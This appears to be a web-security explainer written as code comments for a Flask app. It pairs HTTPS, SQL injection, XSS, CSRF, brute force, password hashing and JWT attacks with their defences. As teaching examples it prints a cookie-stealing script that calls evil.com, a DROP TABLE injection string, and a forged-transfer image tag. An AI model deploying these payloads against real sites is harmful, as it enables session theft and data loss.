# ================================================================
# SECURITY DEEP DIVE — Every Attack & How We Prevent It
# ================================================================

# ─── 1. HTTPS (SSL/TLS) ───
#
# PROBLEM: Without HTTPS, all data is sent in PLAIN TEXT.
# Anyone on the same WiFi (coffee shop, airport) can READ everything.
#
#   HACKER ON SAME WIFI:
#   ┌─────────────────┐     ┌──────────────┐     ┌──────────────┐
#   │  User's Browser  │────>│  WiFi Router  │────>│  Server       │
#   └─────────────────┘     └──────────────┘     └──────────────┘
#                                  │
#                                  ▼
#                        ┌─────────────────┐
#                        │  HACKER SEES:    │
#                        │  POST /api/login │
#                        │  email=john@gmail.com     │
#                        │  password=secret123       │
#                        └─────────────────┘
#
# SOLUTION: HTTPS encrypts EVERYTHING between browser and server.
# Even if hacker intercepts the data, they see GIBBERISH.
#
#   Browser ───HTTPS───> Server
#   Data encrypted with TLS:
#   "G3hK9s2L...XpQ7vF1" ← meaningless to hacker
#
# In production: Get SSL cert from Let's Encrypt (free).
# Use: https:// instead of http://
# Flask app: app.run(ssl_context='adhoc') for testing

# ─── 2. SQL Injection ───
#
# PROBLEM: If we directly insert user input into SQL queries,
# hackers can execute malicious SQL.
#
#   DANGEROUS CODE (NEVER DO THIS):
#     email = request.form['email']
#     cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
#
#   HACKER ENTERS:
#     Email: '; DROP TABLE users; --
#
#   RESULTING SQL:
#     SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
#     └─────────┬────────┘└───────┬──────┘└──┘
#          Normal query       Users table DELETED    Comment
#
#     YOUR ENTIRE USER DATABASE IS GONE.
#
# SOLUTION: Parameterized Queries (%s placeholders)
#
#   SAFE CODE:
#     cursor.execute(
#         "SELECT * FROM users WHERE email = %s",
#         (email,)
#     )
#
#   If email = "'; DROP TABLE users; --"
#   MySQL treats it as a LITERAL STRING value, not SQL code.
#   It searches for a user whose email is literally: '; DROP TABLE users; --
#   (which won't find anything, but won't delete anything either)

# ─── 3. XSS (Cross-Site Scripting) ───
#
# PROBLEM: If we display user input without escaping,
# hackers can inject JavaScript that runs in OTHER users' browsers.
#
#   HACKER REGISTERS WITH USERNAME:
#     <script>
#       fetch('https://evil.com/steal?cookie=' + document.cookie)
#     </script>
#
#   If another user views a page showing this username,
#   the SCRIPT EXECUTES and SENDS their cookie to the hacker.
#
#   ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
#   │  Hacker          │────>│  Server          │────>│  Victim Browser  │
#   │  Registers with  │     │  Stores <script> │     │  Renders page     │
#   │  malicious JS    │     │  in database     │     │  Script EXECUTES  │
#   └─────────────────┘     └─────────────────┘     └────────┬────────┘
#                                                              │
#                                                              ▼
#                                                    Hacker gets victim's cookie
#
# HOW WE PREVENT IT:
# 1. Flask's Jinja2 templates AUTO-ESCAPE HTML by default.
#    {{ user.username }} → becomes plain text, not HTML
#    No script execution possible.
#
# 2. HttpOnly cookies: Our auth_token cookie has HttpOnly=True
#    Even if XSS runs, JavaScript CANNOT read document.cookie
#    The hacker's script gets NOTHING.
#
# 3. Content-Security-Policy header restricts what scripts can run

# ─── 4. CSRF (Cross-Site Request Forgery) ───
#
# PROBLEM: If you visit a malicious site while logged into our site,
# that site can forge requests to OUR server using YOUR cookies.
#
#   ATTACK FLOW:
#   1. User logs into bank.com → browser has bank.com cookie
#   2. User visits evil.com (in another tab)
#   3. evil.com has: <img src="https://bank.com/transfer?to=hacker&amount=1000">
#   4. Browser sends request to bank.com WITH the cookie
#   5. bank.com thinks: "This is the logged-in user making a transfer!"
#   6. Money sent to hacker!
#
#   ┌─────────────┐     evil.com page loaded      ┌─────────────┐
#   │  User's      │<──────────────────────────────│  evil.com   │
#   │  Browser     │                               └─────────────┘
#   │              │     <img src="bank.com/...">        │
#   │  Has cookie  │─────────────────────────────────────┘
#   │  for bank.com│     Request to bank.com
#   └──────┬──────┘           WITH cookie
#          │                  │
#          ▼                  ▼
#   ┌─────────────┐     ┌─────────────┐
#   │  bank.com   │     │  Hacker's   │
#   │  "Transfer  │     │  Account    │
#   │  successful"│     │  +$1000     │
#   └─────────────┘     └─────────────┘
#
# SOLUTION: SameSite=Lax cookie attribute
# Our cookies have: Set-Cookie: auth_token=...; SameSite=Lax
#
# SameSite=Lax means:
#   ✓ Cookie sent when user NAVIGATES to our site (clicks a link)
#   ✗ Cookie NOT sent for cross-site requests (like <img>, <form> POST)
#
# The evil.com <img> request to bank.com does NOT include the cookie!
# bank.com sees an unauthenticated request → rejects the transfer.
#
# For state-changing requests (POST/PUT/DELETE), use CSRF tokens too.

# ─── 5. Rate Limiting ───
#
# PROBLEM: Hackers can try thousands of passwords per second
# using automated scripts (brute force attack).
#
#   HACKER SCRIPT:
#   for password in common_passwords.txt:
#       POST /api/login  {email: "admin@site.com", password: password}
#       Wait 0.1 seconds
#       # 10,000 passwords in 16 minutes
#       # Eventually finds the right one
#
# SOLUTION: Rate limit login attempts
#   - Max 5 login attempts per IP per minute
#   - After 5 failures, block for 1 minute
#   - Use Flask-Limiter or similar library
#
#   from flask_limiter import Limiter
#   limiter = Limiter(app, key_func=lambda: request.remote_addr)
#
#   @app.route('/api/login')
#   @limiter.limit("5 per minute")
#   def login():
#       ...

# ─── 6. Password Storage Best Practices ───
#
# DO NOT USE:
#   ❌ Plain text:           "password123"
#   ❌ MD5:                  "482c811da5d5b4bc6d497ffa98491e38"
#   ❌ SHA-1:                "40bd001563085fc35165329ea1ff5c5ecbdbbeef"
#   ❌ SHA-256:              "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"
#   Reason: All computable in milliseconds with GPU/cloud
#
# USE:
#   ✓ bcrypt:                "$2b$12$..."
#   ✓ Argon2 (recommended):  "$argon2id$v=19$..."
#   ✓ scrypt:                "$scrypt$..."
#
# bcrypt advantages:
#   - Built-in salt (unique per password)
#   - Configurable cost factor (work factor)
#   - Deliberately SLOW (takes ~100ms per hash)
#   - 12 rounds × 100ms = 100 passwords/second brute force
#   - Compare: SHA-256 can do 100 MILLION passwords/second

# ─── 7. JSON Web Token Security ───
#
# JWT STRUCTURE:
#   header.payload.signature
#
# ATTACK: If hacker gets the token, they can impersonate the user.
# PREVENTION:
#   - HttpOnly cookie (prevents JS theft)
#   - Short expiry (24 hours)
#   - Use refresh tokens for longer sessions
#   - Store JWT_SECRET securely (environment variable, NOT in code)
#
# ATTACK: Token manipulation
#   Hacker tries: Change payload user_id from 42 to 1 (admin)
#   But signature verification FAILS because they don't know JWT_SECRET
#   → Server rejects the tampered token
#
# ATTACK: "none" algorithm attack
#   Some old JWT libraries accept {alg: "none", typ: "JWT"} as valid!
#   → Always specify allowed algorithms: algorithms=[JWT_ALGORITHM]
#   → Never accept "none" algorithm

# ─── 8. Additional Security Headers ───
#
# These HTTP headers should be set in production:
#
#   Strict-Transport-Security: max-age=31536000; includeSubDomains
#     Forces HTTPS-only for one year
#
#   X-Content-Type-Options: nosniff
#     Prevents browser from guessing file types
#
#   X-Frame-Options: DENY
#     Prevents clickjacking (your page in an iframe on evil.com)
#
#   Content-Security-Policy: default-src 'self'
#     Only load resources from your own domain
